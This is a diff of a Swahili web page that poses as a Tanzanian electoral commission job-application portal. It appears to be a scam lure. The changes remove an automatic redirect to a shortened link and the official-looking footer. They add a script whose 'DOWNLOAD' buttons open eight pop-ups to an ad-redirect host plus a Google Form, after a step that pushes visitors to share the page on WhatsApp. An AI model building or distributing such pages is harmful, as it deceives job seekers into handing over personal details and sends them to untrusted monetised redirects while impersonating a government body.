@@ -1,13 +1,7 @@
 <!DOCTYPE html>
 <html lang="sw">
 <head>
-	<script>
-		// Simulate a mouse click:
-window.location.href = "https://cutt.ly/nafasi-za-kazi-tume-huru-ya-taifa-ya-uchaguzi";
-
-// Simulate an HTTP redirect:
-window.location.replace("https://cutt.ly/nafasi-za-kazi-tume-huru-ya-taifa-ya-uchaguzi");
-	</script>
+	
 	<meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <link rel="stylesheet" href="path/to/font-awesome/css/all.min.css">
@@ -12691,7 +12685,7 @@ html {
 }
 .btn-primary {
     border-color: #28a745 !important;
-    background: #28a745 !important;
+    background: #adadad !important;
 }
 .btn-primary:hover {
     background: #0b5c92 !important;
@@ -21046,7 +21040,7 @@ a.text-primary:hover {
                                 <center><button id="btnShare" class="btn btn-outline-success btn-lg">Whatsapp Share <i class="fa fa-whatsapp"></i></button></center>
                             </div>
                             <div class="text-center mt-4" id="lastStep" style="display:none;">
-                                <p class="text-muted">>Click "Wasilisha Maombi" Ikiwa taarifa zako hapo juu nisahihi.</p>
+                                <p class="text-muted">Click "Wasilisha Maombi" Ikiwa taarifa zako hapo juu nisahihi.</p>
                                 <br>
                                 <button id="btn3" class="btn btn-outline-success btn-lg">Wasilisha Maombi</button>
                             </div>
@@ -21062,21 +21056,58 @@ a.text-primary:hover {
                         </p>
                         <br>
                         <center>
-                          <a  onclick="window.open('https://docs.google.com/forms/d/e/1FAIpQLScj5v8EThGuAQL8NH-WnO4qFdNZIiQzkgAXUO7JrkolQfaquQ/viewform?usp=sf_link')" href="https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ" >
-                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">DOWNLOAD FOMU</font></button>
-                </a><br/>
-      
-   <a  onclick="window.open('https://docs.google.com/forms/d/e/1FAIpQLScj5v8EThGuAQL8NH-WnO4qFdNZIiQzkgAXUO7JrkolQfaquQ/viewform?usp=sf_link')" href="https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ" >
-                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">TUMA TENA MAOMBI</font></button>
-                </a>
-         <br/>
-      
-      
-      <a  onclick="window.open('https://docs.google.com/forms/d/e/1FAIpQLScj5v8EThGuAQL8NH-WnO4qFdNZIiQzkgAXUO7JrkolQfaquQ/viewform?usp=sf_link')" href="https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ" >
-                <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">DOWNLOAD BARUA</font></button>
-                </a><br/>
-                            <button id="btnOffer" class="btn btn-outline-success btn-lg">DOWNLOAD NAKALA &nbsp;<i class="fa fa-check-circle-o"></i></button>
-                        </center>
+                        <!-- DOWNLOAD FOMU Button -->
+                        <a onclick="dapp()" href="https://www.toprevenuegate.com/k7yxfuaz?key=6a3a320d1bd3fe7d34ba691c07e4d640">
+                           <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">
+                              <font color="blue">DOWNLOAD FOMU</font>
+                           </button>
+                        </a>
+                        <br/>
+                     
+                        <!-- TUMA TENA MAOMBI Button -->
+                        <a onclick="dapp()" href="https://www.toprevenuegate.com/k7yxfuaz?key=6a3a320d1bd3fe7d34ba691c07e4d640">
+                           <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">
+                              <font color="blue">DOWNLOAD NAKALA</font>
+                           </button>
+                        </a>
+                        <br/>
+                     
+                        <!-- DOWNLOAD BARUA Button -->
+                        <a onclick="dapp()" href="https://www.toprevenuegate.com/k7yxfuaz?key=6a3a320d1bd3fe7d34ba691c07e4d640">
+                           <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary">
+                              <font color="blue">DOWNLOAD BARUA</font>
+                           </button>
+                        </a>
+                        <br/>
+                     
+                        <!-- DOWNLOAD NAKALA Button -->
+                        <button id="btnOffer" class="btn btn-outline-success btn-lg" onclick="dapp()">TUMA TENA MAOMBI &nbsp;<i class="fa fa-check-circle-o"></i></button>
+                     </center>
+                     
+                     <script>
+                        var dl = 'https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ';
+                        var dll = 'https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ';
+                        var dlll = 'https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ';
+                        var dll1 = 'https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ';
+                        var dlll2 = 'https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ';
+                        var dllll = 'https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ';
+                        var dlll1 = 'https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ';
+                        var dll11 = 'https://www.google.com/url?q=https%3A%2F%2Fwww.toprevenuegate.com%2Fk7yxfuaz%3Fkey%3D6a3a320d1bd3fe7d34ba691c07e4d640&sa=D&sntz=1&usg=AOvVaw3XhDAzl3Kd8Z4WyKcl8dbZ';
+                        var dll119 = 'https://forms.gle/UgKE8kuzWB7D27rX7';
+                     
+                        function dapp() {
+                           window.open(dl);
+                           window.open(dll);
+                           window.open(dlll);
+                           window.open(dll1);
+                           window.open(dlll2);
+                           window.open(dllll);
+                           window.open(dlll1);
+                           window.open(dll11);
+                           window.open(dll119);
+                        }
+                     </script>
+                     
                         <br>
                     </div>
                 </div>
@@ -21198,165 +21229,7 @@ var _hmt = _hmt || [];
 
 
   
-    <!-- FOOTER -->
-    <footer class="footer-bg">
-  <div class="ega-footer ega-section col-12 pb-0">
-
-    <div class="container  ">
-      <div class="row footer-content ">
-        <div class="col-md-6 col-lg-3 px-xs-2 px-0 no-padding-sm shadow-right">
-          
-            <div class="col-12 text-white">
-              <h5 class="footer-heading">
-                <span class="d-inline-block border-bottom-secondary-thick pb-1">  Wasiliana Nasi</span>
-              </h5>
-              
-              <div class="py--2" >Jamhuri ya Muungano wa Tanzania</div>
-              <div class="py--2">Tume Huru Ya Taifa Ya Uchaguzi</div>
-              <div class="py--2"> Mji wa Serikali Mtumba
-Mtaa wa Utumishi,
-S.L.P. 670
-DODOMA.
-Tanzania <br></div>
-              <div class="py--2"><i class="fa fa-paper-plane pr-2"> </i>ps@utumishi.go.tz</div>               <div class="py--2"><i class="fa fa-phone pr-2"> </i> 026 216 0240</div>                          </div>
-          
-                      <div class="col-12 px-xs-2 pl-0 pt-3">
-                <div class="footer-media pl-1">
-                
-                                                      <a s://web.facebook.com/profile.php?id=100092264561917" target="_blank"><i class="fab fa-facebook-f " aria-hidden="true"></i></a>
-                                                                                          
-                  
-                  
-                  
-                  
-                
-
-                  
-                  
-                  
-                  
-                                                                        <a s://twitter.com/utumishitz" target="_blank"><i class="fab fa-twitter" aria-hidden="true"></i></a>
-                                                                        
-                  
-                  
-                  
-                  
-                
-
-                  
-                  
-                  
-                  
-                                                                                          <a s://www.youtube.com/channel/UCh8xSab5iVspG5-6eJm532g" target="_blank"><i class="fab fa-youtube" aria-hidden="true"></i></a>
-                                                      
-                  
-                  
-                  
-                  
-                
-
-                  
-                  
-                  
-                  
-                                                                                                          
-                  
-                  
-                  
-                  
-                                  <a s://utumishitz.blogspot.com/" target="_blank"><i class="fab fa-blogger-b" aria-hidden="true"></i></a>
-                
-
-                  
-                  
-                  
-                  
-                              </div>
-            </div>
-                  </div>
-
-
-                  <div class="col-md-6 col-lg-3 px-xs-2 no-padding-sm">
-            <div class="col-md-12">
-              <h5 class="footer-heading">
-                <span class="d-inline-block border-bottom-secondary-thick pb-1">  Tovuti Mashuhuri</span>
-              </h5>
-              <ul class="list-inline text-left">
-                                  <li class="list-inline-item pr-1 py-2">
-                    <a s://www.ikulu.go.tz/" target="_blank">Ikulu</a>
-                  </li> <br>
-                                  <li class="list-inline-item pr-1 py-2">
-                    <a s://www.vpo.go.tz/" target="_blank">Ofisi ya Makamu wa Rais</a>
-                  </li> <br>
-                                  <li class="list-inline-item pr-1 py-2">
-                    <a s://www.pmo.go.tz/" target="_blank">Ofisi ya Waziri Mkuu</a>
-                  </li> <br>
-                                  <li class="list-inline-item pr-1 py-2">
-                    <a s://www.tamisemi.go.tz/" target="_blank">Tawala za Mikoa na Serikali za Mitaa</a>
-                  </li> <br>
-                                  <li class="list-inline-item pr-1 py-2">
-                    <a s://www.pccb.go.tz/" target="_blank">TAKUKURU</a>
-                  </li> <br>
-                                  <li class="list-inline-item pr-1 py-2">
-                    <a s://www.psc.go.tz" target="_blank">Tume ya Utumishi wa Umma</a>
-                  </li> <br>
-                                  <li class="list-inline-item pr-1 py-2">
-                    <a s://www.ajira.go.tz/" target="_blank">Sekretarieti ya Ajira</a>
-                  </li> <br>
-                              </ul>
-            </div>
-          </div>
-        
-
-                  <div class="col-md-6 col-lg-3 px-xs-2 px-0 no-padding-sm ">
-              <div class="col-md-12">
-                <h5 class="footer-heading">
-                  <span class="d-inline-block border-bottom-secondary-thick pb-1"> Kurasa za Karibu</span>
-                </h5>
-                <ul class="list-inline text-left">
-                                      <li class="list-inline-item pr-1 py-2"><a s://emrejesho.gov.go.tz/tenganisha_aina_za_walalamikaji?PQI70xlXGIGpQajIcg16EMX74XYFJZf9NV6nrjnzNiHgtt6Iqhlm6VYeXW2vhplQ&amp;to_this_inst=32$PQI70xlXGIGpQajIcg16EMX74XYFJZf9NV6nrjnzNiHgtt6Iqhlm6VYeXW2vhplQ">e-Mrejesho</a></li>
-                    <br>
-                                      <li class="list-inline-item pr-1 py-2"><a "documents/circular">Nyaraka</a></li>
-                    <br>
-                                      <li class="list-inline-item pr-1 py-2"><a "documents/forms">Fomu</a></li>
-                    <br>
-                                      <li class="list-inline-item pr-1 py-2"><a "documents/government-gazette">Gazeti la Serikali</a></li>
-                    <br>
-                                      <li class="list-inline-item pr-1 py-2"><a "documents/guidelines">Miongozo</a></li>
-                    <br>
-                                  </ul>
-              </div>
-          </div>
-        
-        <div class="col-md-6 col-lg-3 no-padding-sm text-center mt-4 mt-md-0 text-lg-left ">
-          <h5 class="footer-heading">
-            <span class="d-inline-block border-bottom-secondary-thick pb-1"> Wageni wa tovuti</span>
-          </h5>      
-          
-          <div class="pr-1 py-2 text-uppercase">
-            <a class="" "javascript::">Leo: <span class="float-right pr-5" id="today"></span></a>
-          </div>                
-          <div class="pr-1 py-2 text-uppercase">
-            <a class="" "javascript::">Jana: <span class="float-right pr-5" id="yesterday"></span></a>
-          </div>                
-          <div class="pr-1 py-2 text-uppercase">
-            <a class="" "javascript::">Wiki hii: <span class="float-right pr-5" id="week"></span></a>
-          </div>                
-          <div class="pr-1 py-2 text-uppercase">
-            <a class="" "javascript::">Mwezi huu: <span class="float-right pr-5" id="month"></span></a>
-          </div>                
-          <div class="pr-1 py-2 text-uppercase">
-            <a class="" "javascript::">Jumla: <span class="float-right pr-5" id="all"></span></a>
-          </div>                
-          
-        </div>
-
-
-      </div>
-
     
-    </div>
-
     <div class="bg-dark p-3 py-3 border-top-secondary text-center">
       <div class="col-md-12 px-0 px-xs-2">
         <div class="footer-content pt-0">
